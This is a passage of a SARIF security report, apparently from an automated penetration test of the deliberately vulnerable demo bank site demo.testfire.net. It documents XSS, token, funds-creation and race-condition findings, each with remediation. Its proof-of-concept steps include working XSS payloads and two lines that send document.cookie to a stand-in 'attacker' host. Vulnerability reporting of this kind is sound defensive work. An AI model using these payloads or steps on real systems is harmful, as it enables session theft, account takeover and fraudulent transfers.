          "partialFingerprints": {
            "primaryLocationLineHash": "0903a55ac6f0df18a4fbd707ce7ef4bfb0ce9aa7b71a9f6916bc4177dfbe9b0c"
          },
          "properties": {
            "security-severity": "6.1",
            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0012",
              "severity": "medium",
              "cvss": 6.1,
              "timestamp": "2026-09-20 21:48:29 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/sendFeedback",
              "method": "POST",
              "cwe": "CWE-79",
              "impact": "An attacker can host an auto-submitting page that POSTs the feedback form with a malicious `name` value; when a victim submits it (or is tricked into it), arbitrary JavaScript executes in the app origin in the victim's session, enabling authenticated action riding, cookie/data theft and in-origin phishing. The endpoint has no CSRF protection, so the request can be triggered cross-site.",
              "technical_analysis": "`POST /sendFeedback` renders a confirmation page that includes the submitted `name` and `email_addr` values. The `name` value is inserted into element content without encoding:\n\n```html\n<p>Thank you for your comments, <img src=x onerror=document.title=5>.  They will be reviewed by our Customer Service staff ...</p>\n```\n\nNo output encoding, no CSP and no X-XSS-Protection are present. Because the sink is the POST body, delivery requires the victim to issue the request (e.g. an attacker page that auto-submits a hidden form to `/sendFeedback`). The `email_addr` value is lower-cased on output, but `name` is echoed verbatim.",
              "remediation_steps": "HTML-encode the `name` (and `email_addr`) values before rendering the confirmation page. Prefer template auto-escaping or a safe DOM text sink. Add a CSRF token to the feedback form and a restrictive `Content-Security-Policy` to limit impact.",
              "counterevidence": "The payload requires a POST, so a plain link is not sufficient — this raises the interaction bar (reflected via a form, not a GET). Checked for a server-side filter or WAF on the field: none — the raw `<img ... onerror=...>` is echoed unchanged. Checked whether the value is written to an attribute or element content: it is element content, and the handler executed in a browser. The confirmation page returns no CSP. Considered whether only the lower-cased `email_addr` is rendered: `name` is rendered verbatim and is the exploitable field.",
              "confidence": "high",
              "severity_change_conditions": "If a CSRF token and strict output encoding were added the finding would be resolved; a demonstrated ability to deliver the POST without any victim interaction would raise severity.",
              "poc": {
                "description": "1. Build an HTML page containing a form that auto-submits to `http://demo.testfire.net/sendFeedback` with `name=<img src=x onerror=document.title=5>`, a valid `email_addr`, `subject`, `comments` and `cfile=comments.txt`.\n2. Have the victim open the attacker page (or otherwise POST the form).\n3. `/sendFeedback` returns the confirmation page reflecting the payload unencoded; the `onerror` handler fires and `document.title` becomes `5`.\n4. To steal data, use `name=<img src=x onerror=\"new Image().src='//attacker/'+document.cookie\">`.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-522",
          "ruleIndex": 1,
          "level": "note",
          "message": {
            "text": "API Bearer Token Embeds Reversible Credentials, Ignores Its Signature, and Survives Logout\n\nThe bearer token issued by `POST /api/login` is not an opaque session token. It is `base64(base64(username) + \":\" + base64(password) + \":\" + <eight random bytes>)`, so the account's plaintext password can be recovered by anyone who observes the token. The trailing eight bytes are not validated (a token with an empty or arbitrary trailing value is accepted), and `GET /api/logout` reports success without invalidating previously issued tokens, which therefore remain valid indefinitely."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/api/login",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "9b547e07f98b7113f31bb85fd602fa9060b7a6770e416e09e179942dbb82a838"
          },
          "properties": {
            "security-severity": "3.7",
            "strix_vuln_class_hash": "5a18362652efec41f2a5b0586690d515e59b5bd7d086ad4cbae4916b3b459741",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0013",
              "severity": "low",
              "cvss": 3.7,
              "timestamp": "2026-09-20 21:48:33 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/api/login",
              "method": "POST",
              "cwe": "CWE-522",
              "impact": "Any exposure of a token — through logs, browser history, an XSS payload, a referrer header, or an intermediary — discloses the user's plaintext password (not merely a session), enabling credential reuse against the web login. Because tokens are not revoked on logout and carry no expiry, a captured token (and the password it contains) remains usable after the user logs out, removing the ability to terminate a compromised session.",
              "technical_analysis": "A successful `POST /api/login` returns a token whose structure is b64 of three colon-separated fields: base64(username), base64(password) and a short random suffix. Decoding the token from a normal `jsmith` login yields the literal credentials and an ignored suffix:\n\n```\ntoken  : YW5OdGFYUm86WkdWdGJ6RXlNelE9Oj8/bDA/\ndecode : anNtaXRo:ZGVtbzEyMzQ=:??l0?     ->  jsmith : demo1234 : <random>\n```\n\nThree independent weaknesses follow from this design:\n\n1. **Reversible credentials.** `base64decode(token)` exposes `base64(username)` and `base64(password)`; base64 is not encryption, so the password is recovered directly. The recovered password was verified to work against the web login (`POST /doLogin`).\n\n2. **No signature / integrity check.** Tokens minted with an empty or arbitrary suffix are accepted, so the trailing value provides no integrity guarantee:\n\n```python\nforge(\"jsmith\", \"demo1234\", b\"\")            # empty suffix        -> 200\nforge(\"jsmith\", \"demo1234\", b\"12345678\")    # arbitrary suffix    -> 200\n```\n\nThe password field itself *is* validated server-side (a token whose password field is wrong returns `401`), so the practical effect is that the token is a portable, reversible credential rather than a verifiable session artifact.\n\n3. **No revocation.** After calling `GET /api/logout` (which returns `{\"LoggedOut\":\"True\"}`), the same token is still accepted by `GET /api/account` (`200`). Logging out of the web application (`/logout.jsp`) likewise does not invalidate an API token. The token contains no timestamp and there is no server-side token store, so there is no expiry and no way to revoke access.",
              "remediation_steps": "Stop encoding credentials into the token. Issue an opaque, high-entropy random session identifier (or a properly signed JWT using a server-held key) that contains no username or password material. Store session state server-side with an explicit expiry and a revocation list, and invalidate the session record in the logout handler so that logout truly terminates the session. If a self-contained signed token is used, verify the signature and expiry on every request and reject tokens whose signature does not validate; never accept a token with a missing or malformed signature.",
              "counterevidence": "Actively tested whether the weak structure enables a true authentication bypass: a forged token whose password field is wrong is rejected (`401`), so the server does re-validate the decoded credentials and a pure \"forge without credentials\" bypass is not available (that route is the separate SQL-injection finding). The trailing 8 bytes being unvalidated therefore does not, by itself, grant access without valid credentials. What remains is that the token is a reversible credential with no expiry and no revocation. Severity is kept at Low because exploitation requires the attacker to already hold a token; there is no demonstrated acquisition path in this report.",
              "confidence": "high",
              "severity_change_conditions": "Demonstrating a concrete token-acquisition vector (for example a reflected/stored XSS that reads the token, or token leakage via referrer/logs that an unauthenticated attacker can trigger) would raise this to Medium/High by removing the \"attacker already holds the token\" precondition.",
              "poc": {
                "description": "1. Authenticate with valid credentials at `POST /api/login` and capture the returned `Authorization` token.\n2. Base64-decode the token to obtain `<base64(username)>:<base64(password)>:<random>`; base64-decode the first two fields to recover the plaintext username and password.\n3. Reuse the recovered username/password on the web login `POST /doLogin`; the login succeeds, proving the token discloses reusable credentials.\n4. Build a token with an empty trailing field for the same user and send it to `GET /api/account`; the request is accepted (`200`), showing the suffix is not validated.\n5. Call `GET /api/logout` with a token, then replay the same token against `GET /api/account`; it still returns the account list (`200`), showing logout does not revoke the token.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-682",
          "ruleIndex": 7,
          "level": "warning",
          "message": {
            "text": "Self-transfer (fromAccount equal to toAccount) creates funds instead of being a no-op\n\nThe fund-transfer operation credits the destination account but does not debit the source when both accounts are the same. Because the server does not enforce that `fromAccount` differs from `toAccount` (only the browser JavaScript does), an attacker can repeatedly \"transfer\" an amount to the same account and increase its balance without any source of funds. This affects both the web endpoint `POST /bank/doTransfer` and the REST endpoint `POST /api/transfer`."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/bank/doTransfer",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "ad0799ec1646bfab54c3fa57f163d493347831a44331b9296cc4ad8103561fbc"
          },
          "properties": {
            "security-severity": "6.5",
            "strix_vuln_class_hash": "6ba127aa80a6d507b26e3974701ad80577cce695c64b3ff9220b240b14486202",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0014",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-09-20 21:48:39 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/bank/doTransfer",
              "cwe": "CWE-682",
              "impact": "An authenticated user can mint unlimited funds into any account they can name as both source and destination, effectively setting the balance to an arbitrary value. This breaks conservation of value in the ledger: money is created from nothing, transactions are recorded as successful, and the resulting balance is durable and visible through all account views. It undermines the integrity of every downstream financial computation.",
              "technical_analysis": "The transfer routine reads the source and destination balances and writes `source = source - amount` and `destination = destination + amount`. When both identifiers refer to the same account row, the two writes target one row and the final value reflects the credit (`+amount`) rather than a net zero, so the balance increases by the full amount with no corresponding debit. The only guard against `fromAccount == toAccount` lives in client-side JavaScript (`transfer.jsp` `confirminput`: \"From Account and To Account fields cannot be the same\"); the server performs no such check, so a direct HTTP request with identical source and destination is accepted. The same backend is shared by the web `TransferServlet` and the REST `/api/transfer` handler, so both are affected.",
              "remediation_steps": "Enforce on the server (for both the REST API and the web servlet) that `fromAccount` and `toAccount` are different accounts, rejecting the request otherwise — do not rely on the browser JavaScript check. More generally, implement the transfer as a single atomic transaction that debits the source and credits the destination using a conservation-preserving update (e.g., conditional `UPDATE ... WHERE balance >= amount` and `SET balance = balance - amount` / `balance + amount`), so a self-referential move cannot net-credit an account. Add a reconciliation/invariant check that the sum of balances is unchanged by a transfer.",
              "counterevidence": "Checked for a control that would make this safe: (1) the only validation observed is client-side JavaScript in `transfer.jsp` that blocks `from==to` and `amt>0` — it does not execute for a direct HTTP request and was bypassed; (2) confirmed the server returned a success message and the balance actually increased by the full amount, so this is not a display artifact — re-read via the independent `GET /api/account/{no}` endpoint; (3) verified a normal transfer between two different accounts is conserved (source -7, destination +7), so the extra credit is specific to `from==to`; (4) reproduced three times consecutively on the web endpoint and once on the API. No server-side `from!=to` check, WAF, or compensating control exists. Demo (synthetic) data limits real-world loss, but the conservation-of-value invariant is genuinely broken.",
              "confidence": "high",
              "severity_change_conditions": "Because the defect lets an authenticated user arbitrarily inflate their own balance, confirmation that this path handles real value would raise severity to critical; if the transfer logic were made atomic and re-checked with a `from != to` guard the issue disappears.",
              "poc": {
                "description": "1. Authenticate as `jsmith` via `POST /doLogin` (web) or `POST /api/login` (API).\n2. Pick any account the user can reference, e.g. `800023`, and record its balance via `GET /api/account/800023`.\n3. Send a transfer where the source and destination are the SAME account: `POST /bank/doTransfer` with `fromAccount=800023&toAccount=800023&transferAmount=100` (or `POST /api/transfer` with the equivalent JSON body).\n4. Observe HTTP 200 and a success message.\n5. Re-read the balance: it increased by the full `transferAmount` with no corresponding debit.\n6. Repeat step 3 to increase the balance arbitrarily (three repetitions added $300 in testing).",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "error",
          "message": {
            "text": "Stored XSS via /admin/addUser username rendered in /admin/admin.jsp (cross-user confirmed)\n\nA username created through the admin \"Add User\" function is stored and later rendered without encoding in `/admin/admin.jsp`. Cross-user execution is confirmed: a payload stored by one authenticated account executes in a **different** account's session as soon as that user opens the admin console. Because the console is reachable by any authenticated user, not only administrators, a low-privilege attacker can persist script that fires in every user's session — including more privileged ones."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/admin/addUser",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "15dcbff82c7716cf9a33557e89955c7d497627bf979a94c9777c944ae7d81030"
          },
          "properties": {
            "security-severity": "7.6",
            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0015",
              "severity": "high",
              "cvss": 7.6,
              "timestamp": "2026-09-20 21:48:43 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/admin/addUser",
              "method": "POST",
              "cwe": "CWE-79",
              "impact": "The payload is persistent: once stored it executes every time any authenticated user opens `/admin/admin.jsp`, in that viewer's own session. Cross-user execution was demonstrated end to end with two independent accounts — the payload was stored by account A and fired in account B's session, which never touched the Add User function. The hosting console page renders the plaintext `username:password:role` of every account in the `PEOPLE` table, so the stored script can silently exfiltrate that credential material, read whatever the victim's session can read, and drive privileged user-management operations (create users, change passwords) as the victim. This turns a stored value into session-riding and account-takeover capability inside other users' authenticated sessions.",
              "technical_analysis": "`POST /admin/addUser` stores the supplied `username` verbatim in the database (`DBUtil.addUser`, `INSERT INTO PEOPLE (...))`. `/admin/admin.jsp` builds two `<select>` elements from `getBankUsers()` (`SELECT USER_ID FROM PEOPLE`) and writes each stored username twice — once inside the quoted `value` attribute and once as the option's text content — with no HTML encoding:\n\n```jsp title=WebContent/admin/admin.jsp startLineNumber=88 endLineNumber=90\n<select name=\"username\" id=\"username\" size=\"1\">\n\t...\n\t<option value=\"<%=user%>\"><%=user%></option>\n```\n\nThe same construct is repeated for the Change Password form at lines 124-126. A username such as `<img src=x onerror=window.__storedXss=778899>` is therefore emitted raw; in the text-content position the `<img>` is parsed as a real element and its `onerror` handler executes on every page load. There is no output encoding, no CSP and no `X-XSS-Protection`.\n\nCross-user reachability: `getBankUsers()` returns **all** rows regardless of the viewer, so the stored value is emitted on every load of the console by **any** authenticated session. `/admin/*` is protected only by the login `AuthFilter`; the role-checking `AdminFilter` is not effective on this path, so any authenticated user — attacker or victim — reaches both `addUser` and `admin.jsp`. The lack of any per-session filtering is what makes the payload execute in a *different* user's session, as verified below.",
              "remediation_steps": "HTML-entity-encode all stored user fields (especially `username`) wherever they are rendered, using context-appropriate encoding for attribute and text positions; prefer the templating engine's automatic escaping. Enforce a real role check on `/admin/*` (fix the `AdminFilter` path mapping) so only administrators reach the console, and validate usernames against an allow-list (e.g. alphanumerics/`.`/`_`/`-`). Add a restrictive `Content-Security-Policy` as defence in depth.",
              "counterevidence": "The original strongest objection — that execution was only seen in the storing user's own session — is now removed: a second, unrelated account created with an all-lowercase password authenticated successfully and the stored payload executed in its session, with no interaction beyond opening the console. Remaining constraints: the victim must be lured to `/admin/admin.jsp`, which is not the default landing page, so the viewer population is limited to users who open the admin console; and the discrete capabilities the payload can invoke (credential dump, user creation, password change) are already reachable by any authenticated user through separate authorization defects, so the marginal impact of the XSS itself is session riding and silent exfiltration in the victim's identity rather than access that is otherwise impossible. No output encoding, CSP, `X-XSS-Protection` or per-session filtering was found on the render path; the payload was verified to execute in a current browser engine.",
              "confidence": "high",
              "severity_change_conditions": "Evidence that a distinct, more-privileged account (a true administrator) routinely opens `/admin/admin.jsp` and is served the payload would further strengthen the impact; conversely, if the console required a dedicated administrator role that low-privilege users cannot obtain, both storage and victim population would shrink and severity would drop toward medium.",
              "poc": {
                "description": "Two independent authenticated accounts are used: the attacker account stores the payload, and a second, unrelated victim account is the one in whose session the payload fires.\n\n1. Log in as the low-privilege attacker account (`jsmith`).\n2. Store the payload as a username by submitting the Add User form to `POST /admin/addUser` with `username=<img src=x onerror=window.__storedXss=778899>`.\n3. Confirm the payload is now served unencoded by `GET /admin/admin.jsp`.\n4. Create a second, unrelated account through the same function, using an all-lowercase password (the login servlet lower-cases the submitted password before the credential check, so a mixed-case password would never authenticate).\n5. Log in as the second account in a clean browser session and open `/admin/admin.jsp`.\n6. Observe that the stored payload executes in the second account's session: `window.__storedXss` is `778899`, and the injected `<img onerror>` element is present in the live DOM.\n7. Replace the side effect with `new Image().src='//attacker/'+document.cookie` or a state-changing request to turn the execution into session riding / account takeover.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-362",
          "ruleIndex": 8,
          "level": "warning",
          "message": {
            "text": "Race condition (non-atomic balance read-modify-write) on POST /api/transfer causes lost updates despite HTTP 200 successes\n\nFund transfers on `POST /api/transfer` are implemented as a non-atomic read-modify-write of account balances. When multiple transfers are submitted concurrently, they overwrite each other's balance updates, so many transfers that each return HTTP 200 \"success\" are silently lost. The number of applied transfers no longer matches the number of successful responses, producing an inconsistent ledger."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/api/transfer",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "3cc89f3c9f0168daa3ec9bae6016ef39af6cd488547e188087a50995466911bf"
          },
          "properties": {
            "security-severity": "4.3",
            "strix_vuln_class_hash": "f9d04fb963e099420907fe9f258557d41bef40186b892c28dfc35d2ee26549af",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0016",
              "severity": "medium",
              "cvss": 4.3,
              "timestamp": "2026-09-20 21:49:02 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/api/transfer",
              "cwe": "CWE-362",
              "impact": "Transfers acknowledged as successful are silently dropped, so account balances are inconsistent with their transaction history and with the responses returned to clients. A user or automated client that issues transfers under load (including retries) can end up with a ledger that does not reflect the actions reported as completed, undermining financial-record integrity and auditability. Under some interleavings the debit and credit sides diverge slightly, which in a real system would create small reconciliation discrepancies.",
              "technical_analysis": "The transfer handler reads the current balances of the source and destination accounts, computes new values in application memory, and writes them back. There is no row locking, no atomic `balance = balance +/- amount` update, and no optimistic-concurrency (version/ETag) check. When N requests run concurrently they all read the same pre-update balance and write back based on that stale snapshot, so the writes clobber one another: the final balance reflects only the last few writers even though every request returned success. This is the same non-atomic read-modify-write that also underlies the self-transfer funds-creation defect. The window is wide — no synchronization primitive or precise timing is needed; plain parallel requests reproduce it.",
              "remediation_steps": "Make balance updates atomic and serialized. Perform each transfer in a single database transaction using atomic balance mutations (e.g. `UPDATE accounts SET balance = balance - ? WHERE account_id = ?` and `SET balance = balance + ?` inside one transaction) rather than read-compute-write, or apply row-level locking / `SELECT ... FOR UPDATE` on the affected rows for the duration of the transfer. Where optimistic concurrency is used, enforce a version/ETag check and retry on conflict so no acknowledged update is lost. Ensure the success response is only returned after the transaction commits.",
              "counterevidence": "Argued the other side: could the reduced delta be a client/measurement artifact rather than a server-side lost update? Ruled out by the sequential-vs-concurrent contrast on the identical account pair and amount — 30 sequential requests applied exactly (-30/+30), while 30 concurrent requests with the same inputs applied only ~2-4, and every concurrent request returned HTTP 200 with a success message from the server. The delta was measured by re-reading balances through an independent endpoint after all requests completed, so it is not a read-timing artifact. No server-side locking, optimistic-concurrency (ETag/version) check, or serialization was observed; the same read-modify-write is the mechanism behind the separately confirmed self-transfer defect. Impact is limited to integrity/inconsistency (funds are not created for the attacker), which is why severity is moderate rather than high.",
              "confidence": "high",
              "severity_change_conditions": "If concurrency could be shown to create or destroy value asymmetrically for the attacker (rather than merely losing updates), severity would rise to high; confirming that balances are reconciled from a source of truth would lower it. The finding is currently rated on demonstrated ledger inconsistency only.",
              "poc": {
                "description": "1. Authenticate as `jsmith` via `POST /api/login` and capture the token.\n2. Record the balances of two accounts (e.g. `800013` and `800019`).\n3. Baseline: send 30 transfers of `$1` from `800013` to `800019` sequentially; each returns 200 and both balances move by exactly 30.\n4. Re-baseline, then send the identical 30 transfers concurrently (e.g. with asyncio/aiohttp); all 30 return HTTP 200 success.\n5. Re-read the balances: far fewer than 30 were applied (observed ~2–4), demonstrating the lost updates.\n6. Repeat to confirm the delta is consistently far below the number of successful responses.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "DOM-Based XSS and Open Redirect via the url Parameter in /disclaimer.htm\n\nThe `disclaimer.htm` page takes the entire substring after `url=` from its own address and assigns it directly to `window.location.href` when the user clicks the \"OK\" image. The value is not validated against a scheme or host allowlist, so an attacker can supply `javascript:` URIs, which execute script in the demo.testfire.net origin, or an arbitrary external URL that redirects the user off-site."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/disclaimer.htm",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "b616cbf2a96d1f9240af5a30c414ae84b1b142d667eec2dbb3dd53b30d03b32a"
          },
          "properties": {
            "security-severity": "5.4",
            "strix_vuln_class_hash": "33c0ed0c167facda1384b8bf1917b7e5565275c8d378093bdff310818b40b187",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0017",
              "severity": "medium",
              "cvss": 5.4,
              "timestamp": "2026-09-20 21:49:41 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/disclaimer.htm",
              "method": "GET",
              "cwe": "CWE-79",
              "impact": "Script supplied through the `url` parameter runs in the application's origin after a single click, letting an attacker act as the victim: read the non-HttpOnly `AltoroAccounts` cookie, issue authenticated same-origin requests (for example perform transfers or account actions), and render arbitrary content under the bank's domain for phishing. The same parameter also performs an unvalidated redirect to an arbitrary external host, enabling phishing and the theft of tokens/referrers on the trusted domain.",
              "technical_analysis": "`disclaimer.htm` contains an inline `go()` function that is invoked when the user clicks the \"OK\" image:\n\n```javascript\nfunction go() {\n    var iPos = document.URL.indexOf(\"url=\")+4;\n    var sDst = document.URL.substring(iPos,document.URL.length);\n    if (window.opener) {\n        window.opener.location.href = sDst;\n        cl();\n    } else {\n        window.location.href = sDst;\n    }\n}\n```\n\n`sDst` is taken verbatim from the current address and assigned to `window.location.href` with no scheme or host validation. Assigning a `javascript:` URI to `location.href` executes it in the current document's origin, and assigning an `http(s):` URL navigates to that host.\n\nPayloads (the browser exposes the URL portion percent-encoded, so characters such as `(`, `)` and quotes must be pre-encoded in the crafted link):\n\n```text\nhttp://demo.testfire.net/disclaimer.htm?url=javascript:document.title=1\nhttp://demo.testfire.net/disclaimer.htm?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29\nhttp://demo.testfire.net/disclaimer.htm?url=http://example.com/\n```\n\nThe page also writes the target into the body via `document.write(encodeURI(sDst))`; because `encodeURI` percent-encodes the angle brackets, that reflection is not itself exploitable — the execution occurs through the `location.href` sink. Note an auto-redirect branch exists only for `http` values that contain the application's own hostname, so cross-origin or `javascript:` values are not filtered, only deferred to the click.",
              "remediation_steps": "Do not assign user-controlled input to `window.location.href`. Validate the destination against a strict allowlist: accept only absolute `https:` URLs whose host is an expected destination, reject all other schemes (`javascript:`, `data:`, `vbscript:`) and protocol-relative values, and compare the parsed host (after canonicalization) rather than a substring. Where only known links are expected, map link identifiers to fixed destinations server-side instead of passing the target in the URL. Add a Content-Security-Policy that disallows inline script to further reduce the impact of any residual DOM injection.",
              "counterevidence": "Checked whether the reflection in the page body is the actual sink: the body uses `document.write(encodeURI(sDst))`, which percent-encodes `<` and `>`, so a raw HTML/XSS payload there does not execute and the body reflection is not exploitable — the execution is specifically via the `location.href` assignment. Also verified the scheme cannot be assumed safe: `javascript:` does not match the `sDst.indexOf(\"http\")==0` auto-redirect branch, yet still reaches the `location.href` sink, so the only guard (hostname substring for same-domain http links) does not cover it. Confirmed execution is not a side effect of test tooling — the standard `location.href='javascript:...'` assignment executed (attribute set to `MARKER123`), and the real OK-button path executed for both payloads. The residual constraint is the required click (UI:R), reflected in the rating.",
              "confidence": "high",
              "severity_change_conditions": "Removing the required click (for example if a version auto-navigates for these values) would raise this to a zero-interaction reflected XSS (higher severity); conversely, restricting the sink to same-origin http links with a strict scheme check would remove the javascript: execution and leave at most a low-severity open redirect.",
              "poc": {
                "description": "1. Deliver the crafted link `http://demo.testfire.net/disclaimer.htm?url=javascript:document.title=1` to a victim.\n2. The victim lands on the trusted disclaimer page and clicks the \"OK\" image.\n3. `go()` assigns the `url` value to `window.location.href`; the `javascript:` payload executes and the document title becomes `1`.\n4. To demonstrate code execution with a side effect that survives the encoded URL, use `?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29`; after clicking OK the attribute `data-y=\"OK9\"` is present on the body, proving arbitrary script execution in the page origin.\n5. For the redirect variant, browse to `http://demo.testfire.net/disclaimer.htm?url=http://example.com/` and click OK; the browser navigates to `https://example.com/`.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "strix-coverage/xpath-injection",
          "ruleIndex": 9,
          "kind": "pass",
          "level": "none",
          "message": {
            "text": "XPath injection — Ruled out: /bank/queryxpath.jsp `query` parameter\n\nDeployed ServletUtil.searchArticles matches articles with Java String.contains(query) over the parsed DOM — no XPath expression is compiled or evaluated. Proven behaviourally: known substrings match (Mercury, Announces, AppScan, fire, Watchfire) whereas the XPath tautology `ZZZ' or '1'='1` returns the same \"News title not found\" as the false predicate `ZZZ' or '1'='2` and as a benign non-match; the quote/`] | //* | //*['` payloads produced no error and no result-set change. Named control: ServletUtil.searchArticles uses `title.contains(query)` (substring containment), so no XPath metacharacter is interpreted."
          },
          "locations": [
            {
              "logicalLocations": [
